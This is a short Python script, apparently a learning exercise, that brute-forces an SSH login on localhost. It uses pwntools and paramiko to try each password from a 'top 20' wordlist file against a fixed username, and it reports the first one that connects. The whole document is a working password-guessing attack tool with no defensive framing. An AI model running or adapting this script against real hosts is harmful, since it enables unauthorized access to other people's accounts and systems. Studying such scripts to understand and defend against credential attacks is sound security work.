from pwn import * 
import paramiko 

host = "127.0.0.1"
username = "user"
attemps = 0 

with open ("ssh-top20-password.txt", "r") as password_list:
	for password in password_list:
		password = password.strip("\n")
		try:
			print("[{}] attemping pasword '{}'!".format(attemps,password))
			response = ssh(host=host, username=username, password=password, timeout=1)
			if response.connected():
				print("[>>>] Valid Password Found: '{}'".format(password))
				response.close()
				break
			response.close()
		except paramiko.ssh_exception.AuthenticationException:
			print("[X] Invalid Password !")
			attemps+=1 